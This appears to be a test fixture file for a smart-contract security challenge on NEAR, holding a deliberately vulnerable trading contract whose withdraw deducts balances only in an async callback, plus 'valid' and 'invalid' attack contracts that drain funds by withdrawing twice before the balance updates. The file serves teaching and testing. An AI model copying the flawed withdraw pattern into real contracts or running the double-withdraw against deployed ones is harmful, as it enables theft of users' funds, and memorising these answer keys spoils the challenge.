import { TEditorFileMap } from '@agorapp-dao/runner-common/src/types';
import dedent from 'ts-dedent';

export const CODE_NEAR_TRADE = dedent`
  import { NearBindgen, LookupMap, call, NearPromise, near } from 'near-sdk-js';
  
  const GAS = 10_000_000_000_000n;
  const NO_DEPOSIT = 0n;
  
  @NearBindgen({})
  class NEARTrade {
    balances = new LookupMap<bigint>('balances');
  
    // Most of the methods are omitted for brevity. The only thing you can do is deposit and withdraw NEAR tokens.
  
    @call({ payableFunction: true })
    near_deposit() {
      const balance = this.balances.get(near.predecessorAccountId()) ?? 0n;
      this.balances.set(near.predecessorAccountId(), balance + near.attachedDeposit());
      return NearPromise.new('staking-pool.near').functionCall(
        'deposit',
        '',
        near.attachedDeposit(),
        GAS,
      );
    }
  
    @call({})
    near_withdraw({ amount }: { amount: string }) {
      const recipient = near.predecessorAccountId();
      const balance = this.balances.get(recipient) ?? 0n;
      const amountInt = BigInt(amount);
  
      near.log(\`Going to withdraw \${amountInt} from \${balance}\`);
      if (amountInt > balance) {
        throw new Error('Not enough balance');
      }
  
      return NearPromise.new('staking-pool.near')
        .functionCall('withdraw', JSON.stringify({ amount: amountInt.toString() }), NO_DEPOSIT, GAS)
        .then(
          NearPromise.new(near.currentAccountId()).functionCall(
            'withdraw_callback',
            JSON.stringify({ accountId: recipient, amount: amountInt.toString() }),
            NO_DEPOSIT,
            GAS,
          ),
        );
    }
  
    @call({ privateFunction: true })
    withdraw_callback({ accountId, amount }: { accountId: string; amount: string }) {
      const amountInt = BigInt(amount);
  
      const balance = this.balances.get(accountId) ?? 0n;
      near.log(\`Updating balance for \${accountId} from \${balance} to \${balance - amountInt}\`);
      this.balances.set(accountId, balance - amountInt);
      return NearPromise.new(accountId).transfer(amountInt);
    }
  }
`;

export const CODE_STAKING_POOL = dedent`
import { NearBindgen, call, NearPromise, near } from 'near-sdk-js';

@NearBindgen({})
class StakingPool {
  @call({ payableFunction: true })
  deposit() {}

  @call({})
  withdraw({ amount }: { amount: string }) {
    const amountInt = BigInt(amount);
    return NearPromise.new(near.predecessorAccountId()).transfer(amountInt);
  }
}
`;

export const CODE_VALID1: TEditorFileMap = {
  'attack.ts': {
    content: dedent`
      import { NearBindgen, call, NearPromise, near } from 'near-sdk-js';
      
      const GAS = 50_000_000_000_000n;
      const NO_DEPOSIT = 0n;
      
      @NearBindgen({})
      class Attack {
        @call({})
        attack() {
          const balance = 5_000_000n;
        
          return NearPromise.new('near-trade.near')
            .functionCall('near_deposit', '', balance.toString(), GAS)
            .functionCall(
              'near_withdraw',
              JSON.stringify({ amount: balance.toString() }),
              NO_DEPOSIT,
              GAS,
            )
            .functionCall(
              'near_withdraw',
              JSON.stringify({ amount: balance.toString() }),
              NO_DEPOSIT,
              GAS,
            );
        }
      }
    `,
  },
};

export const CODE_VALID2: TEditorFileMap = {
  'attack.ts': {
    content: dedent`
      import { NearBindgen, call, NearPromise, near } from 'near-sdk-js';
      
      const GAS = 50_000_000_000_000n;
      const NO_DEPOSIT = 0n;
      
      @NearBindgen({})
      class Attack {
        @call({})
        attack() {
          const balance = 5_000_000n;

          return NearPromise.new('near-trade.near')
            .functionCall('near_deposit', '', balance, GAS)
            .then(
              NearPromise.new(near.currentAccountId()).functionCall(
                'withdraw',
                JSON.stringify({ amount: balance.toString() }),
                NO_DEPOSIT,
                GAS,
              ),
            );
        }
        
        @call({ privateFunction: true })
        withdraw({ amount }: { amount: string }) {
          return NearPromise.new('near-trade.near')
            .functionCall('near_withdraw', JSON.stringify({ amount }), NO_DEPOSIT, GAS)
            .and(
              NearPromise.new('near-trade.near').functionCall(
                'near_withdraw',
                JSON.stringify({ amount }),
                NO_DEPOSIT,
                GAS,
              ),
            )
            .then(
              NearPromise.new(near.currentAccountId()).functionCall(
                'withdraw_callback',
                '',
                NO_DEPOSIT,
                GAS,
              ),
            );
        }
      
        @call({ privateFunction: true })
        withdraw_callback() {
          near.log('withdraw done twice');
        }

      }
    `,
  },
};

export const CODE_INVALID_SEQUENTIAL: TEditorFileMap = {
  'attack.ts': {
    content: dedent`
      import { NearBindgen, call, NearPromise, near } from 'near-sdk-js';
      
      const GAS = 50_000_000_000_000n;
      const NO_DEPOSIT = 0n;
      
      @NearBindgen({})
      class Attack {
        @call({})
        attack() {
          const balance = 5_000_000n;

          return NearPromise.new('near-trade.near')
            .functionCall('near_deposit', '', balance, GAS)
            .then(
              NearPromise.new('near-trade.near').functionCall(
                'near_withdraw',
                JSON.stringify({ amount: balance.toString() }),
                NO_DEPOSIT,
                GAS,
              ),
            )
            .then(
              NearPromise.new('near-trade.near').functionCall(
                'near_withdraw',
                JSON.stringify({ amount: balance.toString() }),
                NO_DEPOSIT,
                GAS,
              ),
            );
        }
      }
    `,
  },
};
